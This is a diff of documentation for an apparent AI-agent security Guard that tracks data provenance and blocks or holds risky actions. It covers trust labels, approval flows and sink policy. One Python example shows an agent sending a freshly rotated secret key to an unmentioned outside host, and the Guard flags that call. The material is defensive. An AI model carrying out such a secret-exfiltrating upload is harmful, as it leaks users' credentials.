@@ -8,9 +8,9 @@ Custody can check actions from any agent framework, as long as the framework rec
 ## The contract
 
 1. **Record every input** that enters a model's context: user messages, fetched pages, tool results, vault reads, recalled memories, received messages. Each becomes a Datum with a `FROM` edge to its Source, and the Source's trust label is what the Guard reasons about.
-2. **Link every output to the whole context window.** Each model output, memory and message must list every Datum that was in the context as `derived_from`. Over-approximating is safe (a possible false alarm); leaving something out is not (a possible false ALLOW).
+2. **Link every output to the whole context window.** Each model output, memory and message must list every Datum that was in the context as `derived_from`. Over-approximating costs at most a false alarm; leaving something out can cause a false ALLOW. If you deliberately record a narrower list, say so with `"coverage": "REDUCED"`; any certificate whose ancestry contains that output is then downgraded.
 3. **Record the action before running it**, with its arguments as Datums and its sink.
-4. **Ask the Guard, then enforce the verdict**: execute only on `ALLOW`; on `REQUIRE_HUMAN_APPROVAL` wait for a human; on `BLOCK` (or an incomplete search) do not execute.
+4. **Ask the Guard, then enforce the verdict**: execute only on `ALLOW`; on `REQUIRE_HUMAN_APPROVAL` wait for a human; on `BLOCK` do not execute. An incomplete search never yields ALLOW: it comes back as `REQUIRE_HUMAN_APPROVAL` with no approval option (or `BLOCK`), and `search_complete` is false.
 5. **Update the action's status** after executing, so the console and the Warden know what left the system.
 
 ## Over HTTP
@@ -51,7 +51,7 @@ Each call returns the Datum. For the secret, the raw value is not stored:
 }
 ```
 
-Default trust by source: user input and vault reads are **trusted**; web content is **untrusted**; `record/external-content` (email, GitHub, Slack) is untrusted unless you pass `"trust": "trusted"`. A Source keeps the trust label it was first created with, unless a human later [revokes its trust](/docs/guard#retroactive-re-adjudication).
+Default trust by source: user input and vault reads are **trusted**; web content is **untrusted**; `record/external-content` (email, GitHub, Slack) is untrusted unless you pass `"trust": "trusted"`. To set a label explicitly, register the Source first with `POST $B/sources`. Trust labels are policy inputs you supply, not something Custody infers. A Source keeps the trust label it was first created with, unless a human (or a Guard-allowed Warden `revoke_source_trust`) later [revokes its trust](/docs/guard#retroactive-re-adjudication).
 
 ### 2. Record the model's output
 
@@ -91,7 +91,7 @@ curl -s -X POST "$B/guard/actions/act_937ac5b48ac94294/check?enforce=true"
 }
 ```
 
-`enforce=true` also sets the action's status (`approved`, `pending_approval` or `blocked`); without it the check only writes an audit record. Approving this action returns `403 {"detail": "action act_… was blocked as a lethal trifecta; it has no approval option"}`.
+`enforce=true` also sets the action's status (`approved`, `pending_approval` or `blocked`); without it the check only writes a Decision audit record. Approving this action returns `403 {"detail": "action act_… was blocked as a lethal trifecta; it has no approval option"}`.
 
 ### 4. A clean action
 
@@ -105,7 +105,7 @@ curl -s -X POST $B/record/action -H 'content-type: application/json' -d '{
   "sink": {"destination": "https://backups.example.com/upload", "kind": "http"}}'
 ```
 
-The check returns `"decision": "ALLOW"` with a certificate whose claim starts "No untrusted influence was found relative to the recorded provenance graph…". Run the action, then record what happened:
+The check returns `"decision": "ALLOW"` with a certificate whose claim starts "No untrusted influence was found relative to the recorded provenance graph…". The certificate is a statement about the recorded graph and current trust labels, not a proof that the action is safe. Run the action, then record what happened:
 
 ```bash title="Terminal"
 curl -s -X PATCH $B/actions/act_…/status -H 'content-type: application/json' -d '{"status": "executed"}'
@@ -114,9 +114,12 @@ curl -s -X PATCH $B/actions/act_…/status -H 'content-type: application/json' -
 > [!LIMITATION]
 > The HTTP API does not expose exact-value attribution, which the Python runtime applies to every tool argument. A tool argument recorded over HTTP as a model output inherits from its whole context, so a value the user typed can be treated as untrusted when an untrusted page was also in context. When an argument is verbatim a recorded value, pass that Datum's id directly, as above.
 
+> [!WARNING]
+> `PATCH /actions/{id}/status` and `POST /record/approval` write status and approvals directly, without the Guard's approval guardrails (human approver, no approval for a lethal-trifecta BLOCK or an incomplete search). They are for trusted integrators only, and public-demo mode blocks them. Approve held actions with `POST $B/guard/actions/{id}/approve`.
+
 ### Sinks and policy
 
-Give each action a sink with a `kind` the policy understands (`email`, `slack`, `backup`, `http`, `webhook`, `ticket`); anything else is treated as external. Tenants without a registered policy get the default policy, in which **every sink is external**, so a secret payload anywhere needs approval. Internal domains, hosts, Slack workspaces and ticket systems are set in a `GuardPolicy` in code; see [Configuration](/docs/configuration#guard-policy).
+Give each action a sink with a `kind` the policy understands (`email`, `slack`, `backup`, `http`, `webhook`, `ticket`); anything else is treated as external. Without a `kind`, the action type is used. The sink's `external` flag is advisory: the Guard re-classifies every sink from the tenant policy. The HTTP sink has no workspace field, so `slack` and `ticket` sinks recorded over HTTP are always classified external. Tenants without a registered policy get the default policy, in which **every sink is external**, so a secret payload anywhere needs approval. Internal domains, hosts, Slack workspaces and ticket systems are set in a `GuardPolicy` in code; see [Configuration](/docs/configuration#guard-policy).
 
 ## In Python, with the agent runtime
 
@@ -147,11 +150,11 @@ print(rt.outbox.deliveries[0].destination)            # #security (in-memory out
 
 # The same agent, now proposing to send the key to a host Sam never mentioned:
 bad = s.call_tool("upload_backup", destination="https://backup.example.net/in", payload=new_key)
-print(bad.decision.decision.value, bad.decision.triggered_checks)
-# REQUIRE_HUMAN_APPROVAL [confidentiality]
+print(bad.decision.decision.value, [c.value for c in bad.decision.triggered_checks])
+# REQUIRE_HUMAN_APPROVAL ['confidentiality']
 ```
 
-`AgentSession` methods record into the session's context: `user`, `fetch` (a page from the runtime's `web` map), `read_secret`, `rotate_secret`, `recall`, `search_memory`, `receive`, `think`, `remember`, `send_message`, `extract_typed`, and `call_tool`. `rt.approve(action_id, approver=…)` applies a human approval, re-checks and executes; `rt.execute(action_id)` always re-checks and raises `ExecutionDenied` unless the Guard returns ALLOW.
+`AgentSession` methods record into the session's context: `user`, `fetch` (a page from the runtime's `web` map), `read_secret`, `rotate_secret`, `recall`, `search_memory`, `receive`, `think`, `remember`, `send_message`, `extract_typed`, `arg`, and `call_tool`. `rt.approve(action_id, approver=…)` applies a human approval through the Guard (which refuses non-human approvers), re-checks and executes only on ALLOW; `rt.execute(action_id)` always re-checks and raises `ExecutionDenied` unless the Guard returns ALLOW.
 
 ## Through MCP
 
